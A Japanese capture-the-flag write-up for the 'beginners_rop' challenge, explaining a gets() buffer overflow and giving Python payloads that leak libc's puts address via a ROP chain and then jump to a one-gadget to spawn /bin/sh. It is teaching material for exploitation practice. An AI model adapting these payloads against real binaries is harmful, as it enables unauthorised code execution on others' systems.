# beginners_rop

> Do you like programming?
> 
> Did you know Return Oriented Programming?

## Write-up

`src.c`を読むと`gets`が使われておりバッファオーバーフローがあります。
バッファオーバーフローを利用してlibcのアドレスを特定してからOne-gadget RCEによって`/bin/sh`を起動します。

libcのアドレスを特定するためのペイロードを送信します。

```python
payload = b''
payload += b'A' * 0x108
payload += p64(0x401283) # pop rdi; ret
payload += p64(0x404018) # puts@GLIBC_2.2.5
payload += p64(0x401070) # puts@plt
payload += p64(0x401196) # main
```

GOTの`puts`を引数にして`puts`を呼び出すことでlibcの`puts`のアドレスを出力します。
その後`/bin/sh`を起動させるペイロードを送るために再度`main`へ戻します。

出力したアドレスからlibcの`_IO_puts`のアドレスを引くことでlibcのベースアドレスを求めます。
計算したlibcのアドレスを利用して`/bin/sh` を起動するためのペイロードを送信します。

```python
libc_addr = puts_got_addr - 0x80aa0
payload = b''
payload += b'A' * 0x108
payload += p64(libc_addr + 0x4f3d5) # One-gadget RCE
```
